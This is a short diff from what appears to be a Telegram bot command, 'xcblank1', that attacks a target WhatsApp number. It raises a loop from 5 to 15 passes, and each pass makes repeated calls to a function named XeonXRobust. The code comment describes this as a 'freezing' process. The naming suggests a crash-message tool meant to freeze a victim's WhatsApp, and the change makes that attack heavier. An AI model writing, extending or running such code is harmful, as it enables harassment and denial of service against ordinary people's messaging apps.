@@ -676,7 +676,7 @@ bot.command("xcblank1", checkWhatsAppConnection, async ctx => {
   await prosesrespone(target, ctx);
 
   // Melakukan proses freezing 50 kali
-  for (let i = 0; i < 5; i++) {
+  for (let i = 0; i < 15; i++) {
     await XeonXRobust(target, { ptcp: true });
     await XeonXRobust(target, { ptcp: true });
     await XeonXRobust(target, { ptcp: true });
